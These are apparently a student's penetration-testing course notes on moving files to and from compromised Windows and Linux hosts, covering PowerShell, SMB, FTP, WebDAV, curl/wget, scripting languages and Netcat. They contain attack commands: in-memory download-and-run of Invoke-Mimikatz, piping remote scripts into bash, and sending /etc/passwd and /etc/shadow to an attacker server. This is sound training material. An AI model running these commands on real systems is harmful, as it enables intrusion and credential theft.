#CPTS #HTB #cybersecurity 

Understanding different ways to perform file transfers and how networks operate can help us accomplish our goals during an assessment. We must be aware of host controls that may prevent our actions, like application whitelisting or AV/EDR blocking specific applications or activities. File transfers are also affected by network devices such as Firewalls, IDS, or IPS which can monitor or block particular ports or uncommon operations.
# Windows File Transfer Methods
## PowerShell Web Downloads

Most companies allow `HTTP` and `HTTPS` outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains in more restricted networks.

PowerShell offers many file transfer options. In any version of PowerShell, the [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over `HTTP`, `HTTPS` or `FTP`. The following [table](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describes WebClient methods for downloading data from a resource:

|**Method**|**Description**|
|---|---|
|[OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)|Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).|
|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|Returns the data from a resource without blocking the calling thread.|
|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|Downloads data from a resource and returns a Byte array.|
|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|Downloads data from a resource to a local file.|
|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|Downloads data from a resource to a local file without blocking the calling thread.|
|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Downloads a String from a resource and returns a String.|
|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|Downloads a String from a resource without blocking the calling thread.|

Let's explore some examples of those methods for downloading files using PowerShell.

#### PowerShell DownloadFile Method

We can specify the class name `Net.WebClient` and the method `DownloadFile` with the parameters corresponding to the URL of the target file to download and the output file name.

```powershell
# Example
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```
#### PowerShell DownloadString - Fileless Method

As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
# With PIPE
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
# After that
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## SMB Downloads

The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.

We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.

#### Create the SMB Server

```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

To download a file from the SMB server to the current working directory, we can use the following command:
#### Copy a File from the SMB Server

```powershell
copy \\192.168.220.133\share\nc.exe
```

>[!Warning] 
>New versions of Windows block unauthenticated guest access. Configure username and password.
#### Create the SMB Server with a Username and Password

```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
#### Mount the SMB Server with Username and Password

```powershell
net use n: \\192.168.220.133\share /user:test test
# AND THEN
copy n:\nc.exe
```
## FTP Downloads

Another way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.

We can configure an FTP Server in our attack host using Python3 `pyftpdlib` module. It can be installed with the following command:
#### Installing the FTP Server Python3 Module - pyftpdlib

```python
sudo pip3 install pyftpdlib
```
#### Setting up a Python3 FTP Server

```shell
sudo python3 -m pyftpdlib --port 21
```

After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell `Net.WebClient`.

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.
#### Create a Command File for the FTP Client and Download the Target File

```powershell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt 
C:\htb> echo USER anonymous >> ftpcommand.txt 
C:\htb> echo binary >> ftpcommand.txt 
C:\htb> echo GET file.txt >> ftpcommand.txt 
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt

ftp> open 192.168.49.128 
Log in with USER and PASS first. 
ftp> USER anonymous 

ftp> GET file.txt 
ftp> bye 

C:\htb>more file.txt 
This is a test file
```
## PowerShell Base64 Encode & Decode

We saw how to decode a base64 string using Powershell. Now, let's do the reverse operation and encode a file so we can decode it on our attack host.
#### Encode File Using PowerShell

```powershell
C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)) IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo

C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash 
---- 
3688374325B992DEF12793500307566
```

We copy this content and paste it into our attack host, use the `base64` command to decode it, and use the `md5sum` application to confirm the transfer happened correctly.

```shell
echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts

md5sum hosts
3688374325b992def12793500307566d hosts
```

## PowerShell Web Uploads

PowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.

For our web server, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python [HTTP.server module](https://docs.python.org/3/library/http.server.html), which includes a file upload page. Let's install it and start the webserver.

#### Installing a Configured WebServer with Upload

```shell
pip3 install uploadserver

python3 -m uploadserver
```

Now we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-RestMethod` to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.
#### PowerShell Script to Upload a File to Python Upload Server

```powershell
# Descarga la función para subir archivos a un FileUpload Server de Python
C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```
### PowerShell Base64 Web Upload

Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat. We use Netcat to listen in on a port we specify and send the file as a `POST` request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.

```powershell
C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))

C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.

```shell
nc -lvnp 8000

listening on [any] 8000 ... 
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923 
POST / HTTP/1.1 
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) 
WindowsPowerShell/5.1.19041.1682 
Content-Type: application/x-www-form-urlencoded 
Host: 192.168.49.128:8000 
Content-Length: 1820 
Connection: Keep-Alive 

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo 
...SNIP...
```

```shell
# Decode
echo <base64> | base64 -d -w 0 > hosts
```
## SMB Uploads

We previously discussed that companies usually allow outbound traffic using `HTTP` (TCP/80) and `HTTPS` (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks.

An alternative is to run SMB over HTTP with `WebDav`. `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.

When you use `SMB`, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. In the following Wireshark capture, we attempt to connect to the file share `testing3`, and because it didn't find anything with `SMB`, it uses `HTTP`.

![](src/07_smb-webdav-wireshark.png)

#### Configuring WebDav Server

To set up our WebDav server, we need to install two Python modules, `wsgidav` and `cheroot` (you can read more about this implementation here: [wsgidav github](https://github.com/mar10/wsgidav)). After installing them, we run the `wsgidav` application in the target directory.
#### Installing WebDav Python modules

```shell
sudo pip3 install wsgidav cheroot
```
#### Using the WebDav Python module

```shell
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
#### Connecting to the Webdav Share

Now we can attempt to connect to the share using the `DavWWWRoot` directory.

```powershell
C:\htb> dir \\192.168.49.128\DavWWWRoot
```

>[!note] Note
> `DavWWWRoot` is a special keyword recognized by the Windows Shell. 
> 
> **No such folder exists on your WebDAV server**. The `DavWWWRoot` keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server. You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder
#### Uploading Files using SMB

```powershell
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\ 
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
## FTP Uploads

Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host.

```shell
# Important WRITE
sudo python3 -m pyftpdlib --port 21 --write
```

Now let's use the PowerShell upload function to upload a file to our FTP Server.
#### PowerShell Upload File

```shell
C:\htb> (New-Object Net.WebClient).UploadFile('ftp://10.10.14.119/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
#### Create a Command File for the FTP Client to Upload a File

```powershell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt 
C:\htb> echo binary >> ftpcommand.txt 
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt 
C:\htb> echo bye >> ftpcommand.txt 
C:\htb> ftp -v -n -s:ftpcommand.txt 

ftp> open 192.168.49.128 
Log in with USER and PASS first. 

ftp> USER anonymous 
ftp> PUT c:\windows\system32\drivers\etc\hosts 
ftp> bye
```
## Windows File Transfer LAB

### Download the file flag.txt from the web root using wget from the Pwnbox. Submit the contents of the file as your answer.

```shell
wget 10.129.174.196/flag.txt
```
### Upload the attached file named upload_win.zip to the target using the method of your choice. Once uploaded, unzip the archive, and run "hasher upload_win.txt" from the command line. Submit the generated hash as your answer.

```shell
sudo bin/wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```shell
[IO.File]::WriteAllBytes("archivo.zip", [Convert]::FromBase64String("UEsDBAoAAAAAAFmEKVFHXocmIAAAACAAAAAOAAAAdXBsb2FkX3dpbi50eHRlNGZlZWM0NjZkNWRlNzAxMDg5YjVjYzFiZjZkNTkyYVBLAQI/AAoAAAAAAFmEKVFHXocmIAAAACAAAAAOACQAAAAAAAAAIAAAAAAAAAB1cGxvYWRfd2luLnR4dAoAIAAAAAAAAQAYAHjm8KnohtYBzETj5fqG1gEXkIab6IbWAVBLBQYAAAAAAQABAGAAAABMAAAAAAA="))
```
### Also we can create a python server

```shell
sudo python -m http.server 80
```
 
 and download the file

# Linux File Transfer Methods

Linux is a versatile operating system, which commonly has many different tools we can use to perform file transfers. Understanding file transfer methods in Linux can help attackers and defenders improve their skills to attack networks and prevent sophisticated attacks.
## Base64 Encoding / Decoding

Depending on the file size we want to transfer, we can use a method that does not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation. Let's see how we can do this with Bash.
#### Pwnbox - Check File MD5 hash

```shell
md5sum id_rsa
cat id_rsa |base64 -w 0;echo
```

```shell
# Decode de file
echo -n '<base64>' | base64 -d > id_rsa
```
## Web Downloads with Wget and cURL

Two of the most common utilities in Linux distributions to interact with web applications are `wget` and `curl`. These tools are installed on many Linux distributions.

To download a file using `wget`, we need to specify the URL and the option `-O' to set the output filename.

```shell
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

`cURL` is very similar to `wget`, but the output filename option is lowercase `-o'.

```shell
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
## Fileless Attacks Using Linux

Because of the way Linux works and how [pipes operate](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

>[!note] 
>Some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.

Let's take the `cURL` command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe.

```shell
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using `wget`.

```shell
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3 Hello World!
```
## Download with Bash (/dev/tcp)

There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

```shell
exec 3<>/dev/tcp/10.10.10.32/80 # we can use form 3 to ... to start a socket

echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

cat <&3
```
## SSH Downloads

SSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an `SCP` utility for remote file transfer that, by default, uses the SSH protocol.
`CP` (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.

`SCP` is very similar to `copy` or `cp`, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.
#### Enabling and starting the SSH Server

```shell
sudo systemctl enable ssh
sudo systemctl start ssh
```
#### Checking for SSH Listening Port

```shell
netstat -lnpt
```
#### Linux - Downloading Files Using SCP

```shell
scp plaintext@192.168.49.128:/root/myroot.txt .
```
## Upload Operations

There are also situations such as binary exploitation and packet capture analysis, where we must upload files from our target machine onto our attack host. The methods we used for downloads will also work for uploads. Let's see how we can upload files in various ways.
## Web Upload

As mentioned in the `Windows File Transfer Methods` section, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python `HTTP.Server` module, which includes a file upload page. For this Linux example, let's see how we can configure the `uploadserver` module to use `HTTPS` for secure communication.

The first thing we need to do is to install the `uploadserver` module.

```shell
sudo python3 -m pip install --user uploadserver
```

Now we need to create a certificate. In this example, we are using a self-signed certificate.

```shell
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

>[!Important] 
>The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.

```shell
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.

```shell
curl -X POST https://192.168.231.136/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

We used the option `--insecure` because we used a self-signed certificate that we trust.
## Alternative Web File Transfer Method

Since Linux distributions usually have `Python` or `php` installed, starting a web server to transfer files is straightforward. Also, if the server we compromised is a web server, we can move the files we want to transfer to the web server directory and access them from the web page, which means that we are downloading the file from our Pwnbox.

It is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server. What they perhaps lack in security, they make up for flexibility, as the webroot location and listening ports can quickly be changed.
#### Creating a Web Server with Python3

```shell
python3 -m http.server
```
#### Creating a Web Server with Python2.7

```shell
python2.7 -m SimpleHTTPServer
```
#### Creating a Web Server with PHP

```shell
php -S 0.0.0.0:8000
```
#### Creating a Web Server with Ruby

```shell
ruby -run -ehttpd . -p8000
```
#### Download the File from the Target Machine

```shell
wget 192.168.49.128:8000/filetotransfer.txt
```
## SCP Upload

We may find some companies that allow the `SSH protocol` (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the `scp` utility to upload files. Let's attempt to upload a file to the target machine using the SSH protocol.

```shell
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

### Upload the attached file named upload_nix.zip to the target using the method of your choice. Once uploaded, SSH to the box, extract the file, and run "hasher file" from the command line.

```shell
scp upload_nix.zip htb-student@10.129.234.168:/home/htb-student/upload_nix.zip
```

I SSHed the box and extracted the file

```shell
gunzip -S .zip upload_nix.zip
# AND GET THE HASH
hasher upload_nix.zip
```

# Transferring Files with Code

It's common to find different programming languages installed on the machines we are targeting. Programming languages such as Python, PHP, Perl, and Ruby are commonly available in Linux distributions but can also be installed on Windows, although this is far less common.

We can use some Windows default applications, such as `cscript` and `mshta`, to execute JavaScript or VBScript code. JavaScript can also run on Linux hosts.
## Python

Python is a popular programming language. Currently, version 3 is supported, but we may find servers where Python version 2.7 still exists. `Python` can run one-liners from an operating system command line using the option `-c`. Let's see some examples:

-  Python 2 - Download

```python
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

- Python 3 - Download

```python
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
## PHP

`PHP` is also very prevalent and provides multiple file transfer methods. [According to W3Techs' data](https://w3techs.com/technologies/details/pl-php), PHP is used by 77.4% of all websites with a known server-side programming language.

In the following example, we will use the PHP [file_get_contents() module](https://www.php.net/manual/en/function.file-get-contents.php) to download content from a website combined with the [file_put_contents() module](https://www.php.net/manual/en/function.file-put-contents.php) to save the file into a directory. `PHP` can be used to run one-liners from an operating system command line using the option `-r`.
#### PHP Download with File_get_contents()

```php
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

An alternative to `file_get_contents()` and `file_put_contents()` is the [fopen() module](https://www.php.net/manual/en/function.fopen.php). We can use this module to open a URL, read it's content and save it into a file.
#### PHP Download with Fopen()

```php
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
We can also send the downloaded content to a pipe instead, similar to the fileless example we executed in the previous section using cURL and wget.
#### PHP Download a File and Pipe it to Bash

```php
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

>[!note]
>The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.
## Other Languages

`Ruby` and `Perl` are other popular languages that can also be used to transfer files. These two programming languages also support running one-liners from an operating system command line using the option `-e`.
#### Ruby - Download a File

```ruby
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
#### Perl - Download a File

```perl
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
## JavaScript

JavaScript is a scripting or programming language that allows you to implement complex features on web pages. Like with other programming languages, we can use it for many different things.

The following JavaScript code is based on [this](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) post, and we can download a file using it. We'll create a file called `wget.js` and save the following content:

```js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); 
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send(); 
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1; BinStream.Open(); 
BinStream.Write(WinHttpReq.ResponseBody); 
BinStream.SaveToFile(WScript.Arguments(1));
```
We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.

```powershell
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```
## VBScript

[VBScript](https://en.wikipedia.org/wiki/VBScript) ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98.
We'll create a file called `wget.vbs` and save the following content:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") dim bStrm: Set bStrm = createobject("Adodb.Stream") xHttp.Open "GET", WScript.Arguments.Item(0), False xHttp.Send with bStrm .type = 1 .open .write xHttp.responseBody .savetofile WScript.Arguments.Item(1), 2 end with
```

We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.
#### Download a File Using VBScript and cscript.exe

```powershell
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```
## Upload Operations using Python3

If we want to upload a file, we need to understand the functions in a particular programming language to perform the upload operation. The Python3 [requests module](https://pypi.org/project/requests/) allows you to send HTTP requests (GET, POST, PUT, etc.) using Python. We can use the following code if we want to upload a file to our Python3 [uploadserver](https://github.com/Densaugeo/uploadserver).
#### Starting the Python uploadserver Module

```python
python3 -m uploadserver
```
#### Uploading a File Using a Python One-liner

```python
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

Let's divide this one-liner into multiple lines to understand each piece better.

```python
# To use the requests function, we need to import the module first. 
import requests 

# Define the target URL where we will upload the file. 
URL = "http://192.168.49.128:8000/upload" 

# Define the file we want to read, open it and save it in a variable. 
file = open("/etc/passwd","rb") 

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```

We can do the same with any other programming language. A good practice is picking one and trying to build an upload program.

# Miscellaneous File Transfer Methods

We've covered various methods for transferring files on Windows and Linux. We also covered ways to achieve the same goal using different programming languages, but there are still many more methods and applications that we can use.
## Netcat

[Netcat](https://sectools.org/tool/netcat/) (often abbreviated to `nc`) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.
## File Transfer with Netcat and Ncat

The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. Let's create an example and transfer a tool to our target.

In this example, we'll transfer [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) from our Pwnbox onto the compromised machine. We'll do it using two methods. Let's work through the first one.

We'll first start Netcat (`nc`) on the compromised machine, listening with option `-l`, selecting the port to listen with the option `-p 8000`, and redirect the [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_\(stdin\)) using a single greater-than `>` followed by the filename, `SharpKatz.exe`.
